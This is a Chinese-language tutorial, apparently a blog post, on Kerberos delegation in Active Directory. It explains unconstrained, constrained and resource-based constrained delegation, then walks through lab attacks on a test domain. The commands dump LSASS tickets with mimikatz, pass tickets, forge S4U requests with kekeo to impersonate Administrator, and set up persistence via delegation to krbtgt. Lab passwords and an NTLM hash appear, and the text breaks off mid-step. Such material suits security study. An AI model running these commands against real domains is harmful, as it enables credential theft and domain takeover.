+<p>服务账号（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。</p>
+<p><strong>委派的前提</strong></p>
+<p>需要被委派的用户未设置不允许被委派属性。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614503186190-91dbbd9b-023f-4b91-81a9-6ea6ecd19d90.png" alt="img"></p>
+<p>如果勾上则administrator账户不能被委派</p>
+<h2 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h2><p>对于非约束性委派，服务账号可以获取被委派用户的<code>TGT</code>，并将<code>TGT</code>缓存到<code>LSASS</code>进程中，从而服务账号可使用该<code>TGT</code>，模拟用户访问任意服务。</p>
+<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614503684628-a6aede3e-08b7-43c4-9983-934ce527a63d.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614503827081-c20b2746-21bc-4b86-a5fa-9c883d557b4c.png" alt="img"></p>
+<p>从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</p>
+<h2 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h2><p>由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派。对于约束性委派（Constrained Delegation），即Kerberos的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614504725461-cc19a102-5908-40b3-bb5b-b24f9bf13e44.png" alt="img"></p>
+<p>配置了约束委派的账户的 userAccountControl 属性有个FLAG位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且msDS-AllowedToDelegateTo 属性还会指定对哪个SPN进行委派。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614504831744-919520bd-51b9-4f77-b7f3-50e03ec1b702.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614504872390-29338d1c-4ba3-41fe-91f3-1a388fc13163.png" alt="img"></p>
+<h2 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a><strong>基于资源的约束性委派</strong></h2><p>为了使用户/资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置，而把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派只能在运行Windows Server 2012和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束委派的账户的 userAccountControl 属性为 WORKSTATION_TRUST_ACCOUNT，并且msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许基于资源约束性委派的账号的SID。  </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614504949605-bb109e06-df13-4f65-a69b-3a40f9e7d2ca.png" alt="img"></p>
+<h2 id="基于资源的约束性委派和约束性委派差别"><a href="#基于资源的约束性委派和约束性委派差别" class="headerlink" title="基于资源的约束性委派和约束性委派差别"></a>基于资源的约束性委派和约束性委派差别</h2><p>委派的权限授予给了拥有资源的后端(B)，而不再是前端(A)</p>
+<p>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</p>
+<p>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑”msDS-AllowedToActOnBehalfOfOtherIdentity”属性的权限，也就是 将计算机加入域的域用户 和 机器自身 拥有权限。</p>
+<p>传统的约束委派是“正向的”，通过修改服务A的属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。</p>
+<p>而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。</p>
+<h2 id="非约束委派和约束委派的流程"><a href="#非约束委派和约束委派的流程" class="headerlink" title="非约束委派和约束委派的流程"></a>非约束委派和约束委派的流程</h2><h3 id="1-非约束委派流程"><a href="#1-非约束委派流程" class="headerlink" title="1.非约束委派流程"></a>1.非约束委派流程</h3><p><strong>前提：</strong>在机器账号B上配置了非约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问机器B的某个服务，于是向KDC认证。KDC会检查机器B的机器账号的属性，发现是非约束性委派，KDC会将用户的TGT放在ST服务票据中。</p>
+<p>2.用户访问机器B时，TGT票据会和ST服务票据一同发送给机器B</p>
+<p>3.这样B在验证ST服务票据的同时获取了用户的TGT，并将TGT存储在LSASS进程中，从而可以模拟用户访问任意服务</p>
+<p>从网络攻击的角度来看，如果攻击者控制了机器B的机器账号，并且机器B配置了非约束性委派。则攻击者可以诱骗管理员来访问机器B，然后攻击者可以获取管理员的TGT，从而模拟管理员访问任意服务，即获得了管理员权限。</p>
+<h3 id="2-约束性委派流程"><a href="#2-约束性委派流程" class="headerlink" title="2.约束性委派流程"></a>2.约束性委派流程</h3><p><strong>前提：</strong>在服务A上配置到服务B约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问服务A，于是向域控进行kerberos认证，域控返回ST1服务票据给用户，用户使用此服务票据访问服务A</p>
+<p>2.若该服务A允许委派给服务B，则A能使用S4U2Proxy协议将用户发送给自己的可转发的ST1服务票据以用户的身份再转发给域控制器。于是域控返回给服务A一个ST2服务票据，</p>
+<p>3.服务A便能使用获得的ST2服务票据以用户的身份访问服务B。</p>
+<p>从网络攻击的角度来看，如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以利用服务A以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
+<h2 id="筛选非委派属性的账号"><a href="#筛选非委派属性的账号" class="headerlink" title="筛选非委派属性的账号"></a>筛选非委派属性的账号</h2><p>注：域控主机账户默认开启非约束委派</p>
+<h3 id="1-PowerSploit下的PowerView-ps1脚本"><a href="#1-PowerSploit下的PowerView-ps1脚本" class="headerlink" title="1.PowerSploit下的PowerView.ps1脚本"></a>1.PowerSploit下的PowerView.ps1脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line"> </span><br><span class="line">查询域中配置非约束委派的账户</span><br><span class="line">Get-NetUser -Unconstrained -Domain 0day.org</span><br><span class="line">Get-NetUser -Unconstrained -Domain 0day.org | select name</span><br><span class="line">查询域中配置非约束委派的主机：</span><br><span class="line">Get-NetComputer -Unconstrained -Domain 0day.org | select name</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614509039743-d0d0f40a-362b-402d-805c-829564c8732e.png" alt="img"></p>
+<h3 id="2-ADFind"><a href="#2-ADFind" class="headerlink" title="2.ADFind"></a>2.ADFind</h3><p>使用参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind [switches] [-b basedn] [-f filter] [attr list]</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><p>-b：指定要查询的根节点</p>
+</li>
+<li><p>-f：LDAP过滤条件</p>
+</li>
+<li><p>attr list：需要显示的属性</p>
+</li>
+</ul>
+<p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614507400157-b00c06ca-f568-4e55-8d07-c1f746c60d88.png" alt="img"></p>
+<h3 id="3-ldapsearch"><a href="#3-ldapsearch" class="headerlink" title="3.ldapsearch"></a>3.ldapsearch</h3><p>kali自带，可以在域外使用</p>
+<p>查找域中配置非约束委派的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.143:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614507901417-289c6fdf-8bdd-41e1-a8d2-fd07f5b945bc.png" alt="img"></p>
+<h2 id="筛选约束性委派属性的账号"><a href="#筛选约束性委派属性的账号" class="headerlink" title="筛选约束性委派属性的账号"></a>筛选约束性委派属性的账号</h2><h3 id="1-ldapsearch"><a href="#1-ldapsearch" class="headerlink" title="1.ldapsearch"></a>1.ldapsearch</h3><p>查找域中配置约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614508150530-b3c977a8-4b6e-404e-9956-352c89342c35.png" alt="img"></p>
+<h3 id="2-ADFind-1"><a href="#2-ADFind-1" class="headerlink" title="2.ADFind"></a>2.ADFind</h3><p>查找域中配置约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614508244930-b8b4b7db-2732-4ff0-831e-931705c2da9b.png" alt="img"></p>
+<h3 id="3-Empire下的PowerView-ps1脚本"><a href="#3-Empire下的PowerView-ps1脚本" class="headerlink" title="3.Empire下的PowerView.ps1脚本"></a>3.Empire下的PowerView.ps1脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;</span><br><span class="line"> </span><br><span class="line">查询域中配置约束委派的账号</span><br><span class="line">Get-DomainUser -TrustedToAuth -Domain 0day.org | select name</span><br><span class="line">或</span><br><span class="line">Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</span><br><span class="line">查询域中配置约束委派的主机</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain 0day.org | select name</span><br><span class="line">或</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614508356630-0b5d63fd-c515-4235-9e93-bb8e5ddca41c.png" alt="img"></p>
+<h2 id="查询某用户是否具有委派性"><a href="#查询某用户是否具有委派性" class="headerlink" title="查询某用户是否具有委派性"></a>查询某用户是否具有委派性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;</span><br><span class="line">Get-DomainUser 域用户名 -Properties  useraccountcontrol,msds-allowedtodelegateto| fl</span><br></pre></td></tr></table></figure>
+
+<p>当该账号没委派属性时，查询不出任何信息</p>
+<p>当服务账号被设置为 <strong>非约束性委派</strong> 时，其 userAccountControl 属性会包含为 TRUSTED_FOR_DELEGATION</p>
+<p>当被设置为 <strong>约束性委派</strong> 时，其userAccountControl属性包含 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx">TRUSTED_TO_AUTH_FOR_DELEGATION</a>，且 msds-allowedtodelegateto 属性会被设置为哪些 SPN。</p>
+<h2 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h2><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p>
+<p>操作环境：</p>
+<ul>
+<li><p>域：0day.org</p>
+</li>
+<li><p>域控：windows server 2008R2，主机名：OWA2010SP3，IP：<code>192.168.3.142</code></p>
+</li>
+<li><p>域管账户：sqladmin</p>
+</li>
+<li><p>域内主机：windows 8，主机名：PC-mary-0day，IP：192.168.3.63，用户：mary(普通域用户)</p>
+</li>
+</ul>
+<p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p>
+<h3 id="1-查找非约束委派主机账号"><a href="#1-查找非约束委派主机账号" class="headerlink" title="1.查找非约束委派主机账号"></a>1.查找非约束委派主机账号</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614509516455-1491358b-b3c3-45cc-bc03-bd59584d4dbd.png" alt="img"></p>
+<h3 id="2-导出票据"><a href="#2-导出票据" class="headerlink" title="2.导出票据"></a>2.导出票据</h3><p>先访问域控，可以看到是访问失败的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614509654386-36e755fc-d2e0-4495-91de-ebd49431196b.png" alt="img"></p>
+<p>我们用sqladmin或者任意域管账号访问win8（这里域管账号登录在任意一台机器都可以）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614511364136-789a4d4c-7aeb-45a8-a2e2-0ebb857c7912.png" alt="img"></p>
+<p>此时，在主机win8的lsass.exe内存中就会有域用户sqladmin的TGT票据。</p>
+<p>我们在win8上以管理员权限运行mimikatz，执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">导出票据</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614511381478-8af7a135-e2d4-4240-a7e7-156bd63b8758.png" alt="img"></p>
+<h3 id="3-注入票据"><a href="#3-注入票据" class="headerlink" title="3.注入票据"></a>3.注入票据</h3><p>用 mimikatz 将这个票据导入内存中，然后访问域控。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">导入票据</span><br><span class="line">kerberos::ptt [0;33f6ebf]-2-0-60a00000-sqladmin@krbtgt-0DAY.ORG.kirbi</span><br><span class="line">查看票据</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614511501162-c0ab2a06-6b92-40fe-b788-b0f35fc015b0.png" alt="img"></p>
+<h3 id="4-访问域控"><a href="#4-访问域控" class="headerlink" title="4.访问域控"></a>4.访问域控</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614511599983-147e9c41-b99e-4f4f-a25c-3f9c3d60a188.png" alt="img"></p>
+<h2 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h2><p>操作环境：</p>
+<ul>
+<li><p>域：0day.org</p>
+</li>
+<li><p>域内主机：<code>windows 7</code>，主机名：PC-jack-0day，IP：192.168.3.62，用户：jack</p>
+</li>
+<li><p>域控：OWA2010SP3</p>
+</li>
+</ul>
+<p>们设置了机器用户PC-jack-0day对OWA2010SP3的<code>cifs</code>服务的委派</p>
+<h3 id="1-查找约束性委派的主机账号"><a href="#1-查找约束性委派的主机账号" class="headerlink" title="1.查找约束性委派的主机账号"></a>1.查找约束性委派的主机账号</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614512030394-b448d255-f9bf-4d4e-8f08-645fe6df2e01.png" alt="img"></p>
+<h3 id="2-请求用户TGT"><a href="#2-请求用户TGT" class="headerlink" title="2.请求用户TGT"></a>2.请求用户TGT</h3><p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>参数：</p>
+<p><code>/user</code>: 服务用户的用户名</p>
+<p><code>/password</code>: 服务用户的明文密码</p>
+<p><code>/domain</code>: 所在域名</p>
+<p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p>
+<p>kekeo同样也支持使用<code>NTLM Hash</code></p>
+<p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p>
+<p>这里我们知道PC-JACK-0DAY的ntlm hash为：768623e06fae601be0c04759c87d93d3</p>
+<p>我们执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614512609023-bf4f12f6-269c-43ce-b439-03de690dd3db.png" alt="img"></p>
+<p>得到<a href="mailto:&#84;&#x47;&#x54;&#x5f;&#x50;&#67;&#45;&#x4a;&#65;&#x43;&#x4b;&#x2d;&#x30;&#68;&#65;&#89;&#64;&#48;&#68;&#65;&#89;&#46;&#x4f;&#82;&#x47;&#x5f;&#107;&#114;&#98;&#116;&#x67;&#x74;">&#84;&#x47;&#x54;&#x5f;&#x50;&#67;&#45;&#x4a;&#65;&#x43;&#x4b;&#x2d;&#x30;&#68;&#65;&#89;&#64;&#48;&#68;&#65;&#89;&#46;&#x4f;&#82;&#x47;&#x5f;&#107;&#114;&#98;&#116;&#x67;&#x74;</a>~<a href="mailto:&#48;&#100;&#x61;&#121;&#x2e;&#x6f;&#x72;&#x67;&#64;&#x30;&#x44;&#65;&#89;&#x2e;&#79;&#x52;&#71;&#46;&#x6b;&#105;&#114;&#x62;&#105;">&#48;&#100;&#x61;&#121;&#x2e;&#x6f;&#x72;&#x67;&#64;&#x30;&#x44;&#65;&#89;&#x2e;&#79;&#x52;&#71;&#46;&#x6b;&#105;&#114;&#x62;&#105;</a></p>
+<h3 id="3-获取ST"><a href="#3-获取ST" class="headerlink" title="3.获取ST"></a>3.获取ST</h3><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>OWA2010SP3 CIFS</code>的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614512720373-6836d348-ab5c-49a8-81f6-9ffa5a698f0e.png" alt="img"></p>
+<p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的OWA2010SP3 CIFS服务的ST2会保存在当前目录下</p>
+<h3 id="4-注入ST2"><a href="#4-注入ST2" class="headerlink" title="4.注入ST2"></a>4.注入ST2</h3><p>然后我们用mimikatz将ST2导入当前会话即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614512812560-018acb63-ce5f-4798-b26d-0a34a465316d.png" alt="img"></p>
+<h3 id="5-访问域控"><a href="#5-访问域控" class="headerlink" title="5.访问域控"></a>5.访问域控</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614512848484-e23d6a56-1476-4398-a146-999898a24730.png" alt="img"></p>
+<h3 id="6-不知道服务用户密码的情况"><a href="#6-不知道服务用户密码的情况" class="headerlink" title="6.不知道服务用户密码的情况"></a>6.不知道服务用户密码的情况</h3><p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614513600888-89c4ce66-824e-4115-858a-bb2a97cc2f4f.png" alt="img"></p>
+<p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p>
+<p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;3e7]-2-1-40e00000-PC-JACK-0DAY$@krbtgt-0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614513700254-48bf908a-7b47-440a-a03c-83122d7af555.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614513750186-fab6f3ae-cf3d-4ccd-a14f-53c8a2fc6f9e.png" alt="img"></p>
+<h2 id="抓包分析约束性委派攻击过程"><a href="#抓包分析约束性委派攻击过程" class="headerlink" title="抓包分析约束性委派攻击过程"></a>抓包分析约束性委派攻击过程</h2><p>这里可以看到有6个请求</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614514208497-9ab7ff9c-1138-464a-9abc-864132a0ae59.png" alt="img"></p>
+<h3 id="1-AS-REQ"><a href="#1-AS-REQ" class="headerlink" title="1.AS-REQ"></a>1.AS-REQ</h3><p>可以看到用户PC-JACK-0DAY用户向KDC请求一张TGT</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614514342164-4b8cfff6-f866-4449-bac2-2f2d50068cb7.png" alt="img"></p>
+<h3 id="2-AS-REP"><a href="#2-AS-REP" class="headerlink" title="2.AS-REP"></a>2.AS-REP</h3><p>返回一张TGT，这张TGT代表的就是PC-JACK-0DAY这个用户</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614514422182-8ffafeb7-150e-4c78-9c2b-25d1536d5980.png" alt="img"></p>
+<h3 id="3-第一次的TGS-REQ和TGS-REP"><a href="#3-第一次的TGS-REQ和TGS-REP" class="headerlink" title="3.第一次的TGS-REQ和TGS-REP"></a>3.第一次的TGS-REQ和TGS-REP</h3><p>用这张<code>TGT</code>发送<code>S4U2self</code>请求，以<code>Administrator</code>的名义向<code>TGS</code>申请了一张访问自身服务的票据，ST1</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614514743694-a076e9fe-5717-4945-a203-a8ace8ce78b8.png" alt="img"></p>
+<h3 id="4-第二次的TGS-REQ和TGS-REP"><a href="#4-第二次的TGS-REQ和TGS-REP" class="headerlink" title="4.第二次的TGS-REQ和TGS-REP"></a>4.第二次的TGS-REQ和TGS-REP</h3><p>得到<code>ST1</code>之后，然后会带上ST1再次向<code>KDC</code>发起<code>SU42Proxy</code>请求，以<code>administrator</code>的名义请求一张访问<code>OWA2010SP3 cifs</code>服务的票据，ST2</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614515099636-2d6653c5-1b6a-4853-8000-da6697b75cda.png" alt="img"></p>
+<h2 id="利用约束性委派进行权限维持"><a href="#利用约束性委派进行权限维持" class="headerlink" title="利用约束性委派进行权限维持"></a>利用约束性委派进行权限维持</h2><p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p>
+<p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p>
+<p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p>
+<p>我们可以使用powershell来添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser test -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/0day.org&quot;) &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们控制的用户选择的是自己创建的 test 域用户。密码Yicunyiye123</p>
+<ul>
+<li><p>域控：OWA2010SP3 192.168.200.146</p>
+</li>
+<li><p>域：0day.org</p>
+</li>
+<li><p>攻击机：Kali</p>
+</li>
+</ul>
+<p>首先修改 kali 的/etc/hosts/文件，添加如下内容</p>
